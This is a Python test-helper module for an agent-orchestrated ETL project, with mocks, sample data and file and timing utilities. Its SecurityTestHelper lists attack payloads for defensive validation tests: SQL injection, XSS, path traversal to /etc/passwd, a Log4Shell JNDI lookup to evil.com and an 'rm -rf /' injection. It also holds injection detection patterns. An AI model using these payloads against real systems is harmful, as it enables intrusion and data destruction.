"""Test helper utilities for agent-orchestrated-etl."""

import asyncio
import json
import shutil
import tempfile
import time
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import AsyncMock, Mock

import yaml


class AsyncTestHelper:
    """Helper for testing async functions and coroutines."""

    @staticmethod
    async def run_with_timeout(coro, timeout: float = 5.0):
        """Run coroutine with timeout."""
        return await asyncio.wait_for(coro, timeout=timeout)

    @staticmethod
    def create_mock_async_function(return_value: Any = None, side_effect: Any = None) -> AsyncMock:
        """Create a mock async function."""
        mock_func = AsyncMock()
        if return_value is not None:
            mock_func.return_value = return_value
        if side_effect is not None:
            mock_func.side_effect = side_effect
        return mock_func


class AgentTestHelper:
    """Helper utilities for testing agents."""

    @staticmethod
    def create_mock_agent(agent_type: str = "test", agent_id: str = "test-001") -> Mock:
        """Create a mock agent with standard interface."""
        agent = Mock()
        agent.agent_id = agent_id
        agent.agent_type = agent_type
        agent.status = "idle"
        agent.initialize = AsyncMock()
        agent.shutdown = AsyncMock()
        agent.process_message = AsyncMock()
        agent.get_status = Mock(return_value={"status": "idle", "last_activity": time.time()})
        return agent

    @staticmethod
    def create_mock_pipeline_config(pipeline_id: str = "test-pipeline") -> Dict[str, Any]:
        """Create a mock pipeline configuration."""
        return {
            "pipeline_id": pipeline_id,
            "name": f"Test Pipeline {pipeline_id}",
            "source": {
                "type": "mock",
                "config": {"data": "test_data"}
            },
            "transformations": [
                {"type": "mock_transform", "config": {"operation": "test"}}
            ],
            "destination": {
                "type": "mock",
                "config": {"output": "test_output"}
            },
            "metadata": {
                "created_by": "test",
                "tags": ["test", "mock"]
            }
        }

    @staticmethod
    async def wait_for_agent_status(agent: Mock, expected_status: str, timeout: float = 5.0):
        """Wait for agent to reach expected status."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if agent.get_status()["status"] == expected_status:
                return True
            await asyncio.sleep(0.1)
        return False


class DataTestHelper:
    """Helper utilities for testing data operations."""

    @staticmethod
    def create_test_dataframe(rows: int = 100) -> 'pd.DataFrame':
        """Create a test DataFrame with sample data."""
        from datetime import datetime, timedelta

        import pandas as pd

        base_date = datetime(2025, 1, 1)
        data = []

        for i in range(rows):
            data.append({
                "id": i + 1,
                "name": f"Item_{i+1:03d}",
                "category": ["A", "B", "C"][i % 3],
                "value": (i + 1) * 10.5,
                "timestamp": base_date + timedelta(hours=i),
                "is_active": i % 2 == 0
            })

        return pd.DataFrame(data)

    @staticmethod
    def assert_dataframes_equal(df1: 'pd.DataFrame', df2: 'pd.DataFrame',
                              check_dtype: bool = True, check_index: bool = True):
        """Assert that two DataFrames are equal."""
        from pandas.testing import assert_frame_equal

        assert_frame_equal(df1, df2, check_dtype=check_dtype, check_index=check_index)

    @staticmethod
    def create_test_json_data(records: int = 10) -> List[Dict[str, Any]]:
        """Create test JSON data."""
        from datetime import datetime, timedelta

        base_date = datetime(2025, 1, 1)
        data = []

        for i in range(records):
            data.append({
                "id": i + 1,
                "name": f"Record_{i+1:03d}",
                "category": ["alpha", "beta", "gamma"][i % 3],
                "value": (i + 1) * 100,
                "timestamp": (base_date + timedelta(days=i)).isoformat(),
                "metadata": {
                    "source": "test",
                    "version": "1.0",
                    "tags": [f"tag_{j}" for j in range(i % 3 + 1)]
                }
            })

        return data


class MockHelper:
    """Helper utilities for creating mocks."""

    @staticmethod
    def create_mock_config(config_dict: Dict[str, Any]) -> Mock:
        """Create a mock configuration object."""
        config = Mock()
        config.get.side_effect = lambda key, default=None: MockHelper._get_nested_value(config_dict, key, default)
        config.update_runtime_config = Mock()
        config._config_dict = config_dict
        return config

    @staticmethod
    def create_mock_database() -> Mock:
        """Create a mock database connection."""
        db = Mock()
        db.execute = AsyncMock()
        db.fetch = AsyncMock(return_value=[])
        db.fetchone = AsyncMock(return_value=None)
        db.fetchall = AsyncMock(return_value=[])
        db.commit = AsyncMock()
        db.rollback = AsyncMock()
        db.close = AsyncMock()
        return db

    @staticmethod
    def create_mock_s3_client() -> Mock:
        """Create a mock S3 client."""
        s3 = Mock()
        s3.list_objects_v2 = AsyncMock(return_value={"Contents": []})
        s3.get_object = AsyncMock(return_value={"Body": Mock(read=AsyncMock(return_value=b"test data"))})
        s3.put_object = AsyncMock()
        s3.delete_object = AsyncMock()
        s3.head_object = AsyncMock(return_value={"ContentLength": 1024})
        return s3

    @staticmethod
    def create_mock_redis_client() -> Mock:
        """Create a mock Redis client."""
        redis = Mock()
        redis.get = AsyncMock(return_value=None)
        redis.set = AsyncMock(return_value=True)
        redis.delete = AsyncMock(return_value=1)
        redis.exists = AsyncMock(return_value=0)
        redis.ping = AsyncMock(return_value=True)
        redis.publish = AsyncMock()
        redis.subscribe = AsyncMock()
        return redis

    @staticmethod
    def _get_nested_value(config_dict: Dict[str, Any], key: str, default: Any = None) -> Any:
        """Get nested value from config dictionary."""
        keys = key.split('.')
        value = config_dict

        for k in keys:
            if isinstance(value, dict) and k in value:
                value = value[k]
            else:
                return default

        return value


class FileTestHelper:
    """Helper utilities for file-based testing."""

    @staticmethod
    @contextmanager
    def temporary_directory():
        """Create a temporary directory context manager."""
        temp_dir = Path(tempfile.mkdtemp())
        try:
            yield temp_dir
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    @staticmethod
    @contextmanager
    def temporary_file(suffix: str = ".tmp", content: str = ""):
        """Create a temporary file context manager."""
        with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
            f.write(content)
            temp_path = Path(f.name)

        try:
            yield temp_path
        finally:
            if temp_path.exists():
                temp_path.unlink()

    @staticmethod
    def create_test_files(directory: Path, files: Dict[str, str]):
        """Create multiple test files in a directory."""
        for filename, content in files.items():
            file_path = directory / filename
            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_text(content)

    @staticmethod
    def create_test_config_file(directory: Path, config: Dict[str, Any], format_type: str = "yaml") -> Path:
        """Create a test configuration file."""
        if format_type == "yaml":
            filename = "test_config.yaml"
            content = yaml.dump(config, default_flow_style=False)
        elif format_type == "json":
            filename = "test_config.json"
            content = json.dumps(config, indent=2)
        else:
            raise ValueError(f"Unsupported format: {format_type}")

        config_path = directory / filename
        config_path.write_text(content)
        return config_path


class PerformanceTestHelper:
    """Helper utilities for performance testing."""

    @staticmethod
    @contextmanager
    def time_execution():
        """Context manager to measure execution time."""
        start_time = time.perf_counter()
        yield
        end_time = time.perf_counter()
        execution_time = end_time - start_time
        print(f"Execution time: {execution_time:.4f} seconds")

    @staticmethod
    async def measure_async_execution_time(coro) -> tuple:
        """Measure async function execution time."""
        start_time = time.perf_counter()
        result = await coro
        end_time = time.perf_counter()
        execution_time = end_time - start_time
        return result, execution_time

    @staticmethod
    def assert_execution_time_under(seconds: float):
        """Assert that execution time is under specified seconds."""
        def decorator(func):
            if asyncio.iscoroutinefunction(func):
                async def async_wrapper(*args, **kwargs):
                    start_time = time.perf_counter()
                    result = await func(*args, **kwargs)
                    end_time = time.perf_counter()
                    execution_time = end_time - start_time
                    assert execution_time < seconds, f"Execution took {execution_time:.4f}s, expected < {seconds}s"
                    return result
                return async_wrapper
            else:
                def sync_wrapper(*args, **kwargs):
                    start_time = time.perf_counter()
                    result = func(*args, **kwargs)
                    end_time = time.perf_counter()
                    execution_time = end_time - start_time
                    assert execution_time < seconds, f"Execution took {execution_time:.4f}s, expected < {seconds}s"
                    return result
                return sync_wrapper
        return decorator


class SecurityTestHelper:
    """Helper utilities for security testing."""

    @staticmethod
    def create_malicious_payloads() -> List[str]:
        """Create common malicious payloads for testing."""
        return [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/x}",
            "__import__('os').system('rm -rf /')",
            "' OR '1'='1",
            "../../../windows/system32/config/sam",
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>"
        ]

    @staticmethod
    def assert_no_sql_injection(query: str):
        """Assert that query doesn't contain SQL injection patterns."""
        dangerous_patterns = [
            "drop table", "delete from", "insert into", "update set",
            "union select", "exec ", "sp_", "xp_", "--", "/*", "*/"
        ]

        query_lower = query.lower()
        for pattern in dangerous_patterns:
            assert pattern not in query_lower, f"Potential SQL injection detected: {pattern}"

    @staticmethod
    def assert_no_path_traversal(path: str):
        """Assert that path doesn't contain traversal patterns."""
        dangerous_patterns = ["../", "..\\", "/etc/", "\\windows\\", "~"]

        for pattern in dangerous_patterns:
            assert pattern not in path.lower(), f"Potential path traversal detected: {pattern}"


# Pytest fixtures that use these helpers
def pytest_configure():
    """Configure pytest with custom assertions."""
    # Add custom assertion helpers to pytest namespace
    import pytest

    pytest.helpers = type('Helpers', (), {
        'async_test': AsyncTestHelper,
        'agent_test': AgentTestHelper,
        'data_test': DataTestHelper,
        'mock': MockHelper,
        'file_test': FileTestHelper,
        'performance': PerformanceTestHelper,
        'security': SecurityTestHelper,
    })()
